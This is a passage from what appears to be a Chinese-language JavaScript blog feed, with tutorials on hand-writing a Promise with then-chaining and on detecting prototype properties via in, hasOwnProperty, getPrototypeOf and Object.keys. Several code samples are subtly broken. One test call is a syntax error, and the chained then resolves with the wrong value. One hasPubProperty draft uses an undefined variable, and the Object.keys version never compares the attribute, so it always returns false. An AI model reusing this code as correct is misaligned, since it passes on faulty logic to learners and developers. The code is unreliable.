class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.state = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">        <span class="comment">// Promise实例可以多次then，为了保证then中方法按顺序执行，这里把then中成功的回调和失败的回调存放到数组内</span></span><br><span class="line">        <span class="built_in">this</span>.fulfilledEvent = [];</span><br><span class="line">        <span class="built_in">this</span>.rejectedEvent = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> resolve = <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;resolved&quot;</span>;</span><br><span class="line">            <span class="comment">// resolve其实是一个微任务，这里宏任务替换一下</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// 发布方法</span></span><br><span class="line">                <span class="built_in">this</span>.fulfilledEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(result);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> reject = <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.rejectedEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(reason);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            executor(resolve, reject);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.state === <span class="string">&quot;resolved&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">// 订阅方法</span></span><br><span class="line">            <span class="built_in">this</span>.fulfilledEvent.push(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                onFulfilled(result);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.state === <span class="string">&quot;rejected&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.rejectedEvent.push(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">                onRejected(reason);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以简单测试一下</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;res: &quot;</span>, res);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;err: &quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">// data: 100</span></span><br></pre></td></tr></table></figure><h3 id="then-链式调用"><a href="#then-链式调用" class="headerlink" title="then 链式调用"></a>then 链式调用</h3><ul><li><p>当我们连续调用 then 的时候（p1），如果当前 then 中的回调函数执行不返回一个 Promise 实例，那当前的 then（p1） 默认是成功态，然后去发布它的成功事件池子里的方法</p></li><li><p>如果当前 then 中的回调函数执行返回一个 Promise（p2） 实例，那这个 Promise（p2） 实例就会接管（p1）实例的状态，然后去影响（p1）事件池子里的方法发布</p><p>原理：把（p1）的 resolve 和 reject 放到 （p2） 的对应的事件池子里，然后（p2）去发布自己池子里的的方法时，（p1）的 resolve 和 reject 就会执行，从而达到间接的让 （p2）去发布（p1）池子里的方法</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.state = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.fulfilledEvent = [];</span><br><span class="line">        <span class="built_in">this</span>.rejectedEvent = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> resolve = <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;resolved&quot;</span>;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.fulfilledEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(result);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> reject = <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.rejectedEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(reason);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            executor(resolve, reject);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    then(onFulfilled = <span class="function">() =&gt;</span> &#123;&#125;, onRejected = <span class="function">() =&gt;</span> &#123;&#125;) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.fulfilledEvent.push(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> fn = onFulfilled(result);</span><br><span class="line">                fn <span class="keyword">instanceof</span> MyPromise</span><br><span class="line">                    ? fn.then(resolve, reject)</span><br><span class="line">                    : resolve(result);</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="built_in">this</span>.rejectedEvent.push(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> fn = onRejected(reason);</span><br><span class="line">                fn <span class="keyword">instanceof</span> MyPromise</span><br><span class="line">                    ? fn.then(resolve, reject)</span><br><span class="line">                    : resolve(reason);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以简单测试一下</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p2 = p1.then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p1 res: &quot;</span>, res);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            resolve(<span class="number">200</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p1 err: &quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">p2.then(res) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p2 res: &quot;</span>, res);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p2 err: &quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">// p1 res:  100</span></span><br><span class="line"><span class="comment">// p2 res:  200</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Promise&quot;&gt;&lt;a href=&quot;#Promise&quot; class=&quot;headerlink&quot; title=&quot;Promise&quot;&gt;&lt;/a&gt;Promise&lt;/h2&gt;&lt;h3 id=&quot;了解-Promise&quot;&gt;&lt;a href=&quot;#了解-Promise&quot; class=&quot;headerlink&quot; title=&quot;了解  Promise&quot;&gt;&lt;/a&gt;了解  Promise&lt;/h3&gt;&lt;p&gt;Promise 是一个异步操作返回的对象，用来传递异步操作的消息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以解决的问题&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;解决回调地狱问题，不会导致难以维护&lt;/li&gt;
&lt;li&gt;合并多个异步请求，节约时间&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="源码分析" scheme="http://llmysnow.top/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="Promise" scheme="http://llmysnow.top/tags/Promise/"/>
    
    <category term="then链" scheme="http://llmysnow.top/tags/then%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>检测公有属性的封装</title>
    <link href="http://llmysnow.top/posts/3c79077c/"/>
    <id>http://llmysnow.top/posts/3c79077c/</id>
    <published>2021-08-30T02:30:08.610Z</published>
    <updated>2021-08-30T02:30:08.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="检测属性方法"><a href="#检测属性方法" class="headerlink" title="检测属性方法"></a>检测属性方法</h2><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><ul><li><p>检测当前对象是否存在某个属性，不论是公有还是私有，只要有，返回 true</p><p><code>[attr] in [object]</code></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = <span class="number">14</span>;</span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&quot;lion&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Fn.prototype.category = <span class="string">&quot;animal&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> Fn();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;name&quot;</span> <span class="keyword">in</span> f);     <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;category&quot;</span> <span class="keyword">in</span> f); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="hasOwnProperty-NaN"><a href="#hasOwnProperty-NaN" class="headerlink" title="hasOwnProperty"></a>hasOwnProperty</h3><ul><li><p>检测一个属性是不是这个对象的私有属性，如果是，返回true</p><p><code>[object].hasOwnProperty([attr])</code></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = <span class="number">14</span>;</span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&quot;lion&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Fn.prototype.category = <span class="string">&quot;animal&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> Fn();</span><br><span class="line"><span class="built_in">console</span>.log(f.hasOwnProperty(<span class="string">&quot;name&quot;</span>));     <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasOwnProperty(<span class="string">&quot;category&quot;</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="尝试封装检测公有属性"><a href="#尝试封装检测公有属性" class="headerlink" title="尝试封装检测公有属性"></a>尝试封装检测公有属性</h3><ul><li>了解了 <code>in</code> 和 <code>hasOwnProperty</code> 之后我们可以尝试封装检测公有属性的方法</li></ul><p>写出来大概是如下这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.hasPubProperty = <span class="function"><span class="keyword">function</span> (<span class="params">attr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> attr <span class="keyword">in</span> obj &amp;&amp; !obj.hasOwnProperty(attr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>但是这个是有弊端的，比如：某个属性既是私有的，也是公有的，就检测不出来了</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.hasPubProperty = <span class="function"><span class="keyword">function</span> (<span class="params">attr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> attr <span class="keyword">in</span> <span class="built_in">this</span> &amp;&amp; !<span class="built_in">this</span>.hasOwnProperty(attr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = <span class="number">14</span>;</span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&quot;lion&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Fn.prototype.category = <span class="string">&quot;animal&quot;</span>;</span><br><span class="line">Fn.prototype.name = <span class="string">&quot;bird&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> Fn();</span><br><span class="line"><span class="comment">// name既是公有的也是私有的</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;name&quot;</span>));     <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;category&quot;</span>)); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>这样肯定不行，有没有什么方法可以避免这个问题，接下来需要看一下 Object 的其它几个方法</p><h2 id="检测公有属性"><a href="#检测公有属性" class="headerlink" title="检测公有属性"></a>检测公有属性</h2><ul><li>期望结果如下：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = <span class="number">14</span>;</span><br><span class="line">    <span class="built_in">this</span>[A] = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&quot;lion&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> A = <span class="built_in">Symbol</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">Fn.prototype.name = <span class="string">&quot;bird&quot;</span>;</span><br><span class="line">Fn.prototype[A] = <span class="number">200</span>;</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> Fn();</span><br><span class="line"></span><br><span class="line"><span class="comment">// age是私有方法</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;age&quot;</span>));      <span class="comment">// false</span></span><br><span class="line"><span class="comment">// name既是公有的也是私有的</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;name&quot;</span>));     <span class="comment">// true</span></span><br><span class="line"><span class="comment">// A(Symbol)既是公有的也是私有的</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(A));          <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="Object-getPrototypeOf"><a href="#Object-getPrototypeOf" class="headerlink" title="Object.getPrototypeOf"></a>Object.getPrototypeOf</h3><blockquote><p>如果了解前置知识，可直接跳到封装方法处</p></blockquote><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><blockquote><p>ES5新增方法</p></blockquote><ul><li><code>Object.getPrototypeOf([object])</code> 方法返回指定<strong>对象自身的原型</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fn.prototype === <span class="built_in">Object</span>.getPrototypeOf(f); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="封装方法"><a href="#封装方法" class="headerlink" title="封装方法"></a>封装方法</h4><ul><li>借用原型链查找公有属性</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.hasPubProperty = <span class="function"><span class="keyword">function</span> (<span class="params">attr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> self = <span class="built_in">this</span>,</span><br><span class="line">        prototype = <span class="built_in">Object</span>.getPrototypeOf(self);</span><br><span class="line">    <span class="keyword">while</span> (prototype) &#123;</span><br><span class="line">        <span class="comment">// 检测是否存在attr这个属性</span></span><br><span class="line">        <span class="keyword">if</span> (prototype.hasOwnProperty(attr)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 一直按照原型链查找</span></span><br><span class="line">        prototype = <span class="built_in">Object</span>.getPrototypeOf(prototype);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>因为用到了 <code>hasOwnProperty</code>，它不仅能检测可枚举属性还可以检测内置属性</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;toString&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;valueOf&quot;</span>));  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="Object-keys"><a href="#Object-keys" class="headerlink" title="Object.keys"></a>Object.keys</h3><blockquote><p>如果了解前置知识，可直接跳到封装方法处</p></blockquote><h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><blockquote><p>ES5新增方法</p></blockquote><ul><li><code>Object.keys([object])</code> 方法会返回一个数组，数组里面存放指定<strong>对象自身的可枚举属性</strong></li><li><code>Object.keys([object])</code> 方法返回<strong>非 Symbol 私有属性</strong>的数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.xx = <span class="string">&quot;xx&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    name: <span class="string">&quot;lion&quot;</span>,</span><br><span class="line">    age: <span class="number">12</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="number">200</span>,</span><br><span class="line">    <span class="number">0</span>: <span class="number">100</span>,</span><br><span class="line">    [<span class="built_in">Symbol</span>(<span class="string">&quot;a&quot;</span>)]: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(obj)); <span class="comment">// [ &#x27;0&#x27;, &#x27;3&#x27;, &#x27;name&#x27;, &#x27;age&#x27; ]</span></span><br></pre></td></tr></table></figure><ul><li>如果想获取 Symbol 私有属性，可以使用 <code>Object.getOwnPropertySymbols(obj)</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getOwnPropertySymbols(obj)); <span class="comment">// [ Symbol(a) ]</span></span><br></pre></td></tr></table></figure><ul><li>如果想获取所有私有属性（包括Symbol）到一个数组中，可以这么写</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[...Object.keys(obj), ...Object.getOwnPropertySymbols(obj)];</span><br><span class="line"><span class="comment">// [&#x27;0&#x27;, &#x27;3&#x27;, &#x27;name&#x27;, &#x27;age&#x27;, Symbol(a)]</span></span><br></pre></td></tr></table></figure><h4 id="封装方法-1"><a href="#封装方法-1" class="headerlink" title="封装方法"></a>封装方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.hasPubProperty = <span class="function"><span class="keyword">function</span> (<span class="params">attr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="built_in">this</span>,</span><br><span class="line">        prototype = <span class="built_in">Object</span>.getPrototypeOf(self);</span><br><span class="line">    <span class="keyword">while</span> (prototype) &#123;</span><br><span class="line">        <span class="comment">// 检测是否存在attr这个属性</span></span><br><span class="line">        <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(prototype);</span><br><span class="line">        <span class="comment">// 检测浏览器是否支持Symbol</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Symbol</span> !== <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果支持，把Symbol属性合并到数组中</span></span><br><span class="line">            keys = keys.concat(<span class="built_in">Object</span>.getOwnPropertySymbols(prototype));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 一直按照原型链查找</span></span><br><span class="line">        prototype = <span class="built_in">Object</span>.getPrototypeOf(prototype);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注意：内置属性不可以枚举，<code>Object.keys([object])</code> 方法检测不到内置属性</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;toString&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(f.hasPubProperty(<span class="string">&quot;valueOf&quot;</span>));  <span class="comment">// false</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">检测公有属性方法用 in+hasOwnProperty 结合会有一些弊端，比如：某个属性既是私有的，也是公有的，就检测不出来了。使用 Object.getPrototypeOf+hasOwnProperty 可以准确检测</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="封装" scheme="http://llmysnow.top/tags/%E5%B0%81%E8%A3%85/"/>
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="公有属性" scheme="http://llmysnow.top/tags/%E5%85%AC%E6%9C%89%E5%B1%9E%E6%80%A7/"/>
    
    <category term="私有属性" scheme="http://llmysnow.top/tags/%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/"/>
    
    <category term="Object方法" scheme="http://llmysnow.top/tags/Object%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>原生 JS 封装数组方法</title>
